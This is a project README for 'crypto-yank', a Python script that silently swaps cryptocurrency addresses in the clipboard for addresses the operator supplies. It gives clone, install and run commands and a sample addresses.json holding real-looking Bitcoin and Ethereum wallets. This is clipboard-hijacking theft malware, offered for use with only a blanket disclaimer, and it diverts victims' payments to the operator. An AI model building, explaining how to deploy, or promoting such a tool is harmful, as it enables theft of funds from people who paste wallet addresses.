<img src=".github/logo.png" width="180"></img>

## crypto-yank
Replace crypto-currency addresses with your own.

## Demo:
<img src=".github/demo.gif"></img>


## About/Usage:

### About:

crypto-yank matches crypto-currency addresses found in the clipboard using regex. When no addresses are in the clipboard, crypto-yank will remain dormant and not interact with the users clipboard.


### Usage:

```
git clone https://github.com/jacques-andre/crypto-yank
cd crypto-yank
pip3 install -r requirements.txt 
python3 crypto-yank.py
```

##### Optional arguments:

```
--log 
```

`addresses.json`: Holds the master addresses (what you want to replace the clipboard with). Change the "replace_me" strings with your own addresses.

**If you don't want to monitor specific cryptos you can replace the string with `"null"`.**

**Example:**

`addresses.json:`
```json
{
    "btc": "bc1qq9y4gc3c435uqhrctsp67kvyv4enqgky5p2375",
    "xmr": "null",
    "eth": "0x4BDDeddfbb17CAE7A89b305B494FFd70CCE5B29B",
    "dash": "null",
    "xrp": "null",
    "doge": "null",
    "ada" : "null",
    "dot" : "null",
    "lite" : "null"
}
```

Now crypto-yank will only monitor Bitcoin & Ethereum addresses.


## Supported Coins:


- Bitcoin (`$BTC`)
- Dash (`$DASH`)
- Ethereum (`$ETH`)
- Monero (`$XMR`)
- Litecoin (`$LTC`)
- Cardano (`$ADA`)
- Doge (`$DOGE`)
- Ripple (`$XRP`)
- Tron (`$TRX`)


More on the way....

#### Warning:

I am not responsible for any misuse or damage caused by this program. Use this tool at your own risk!
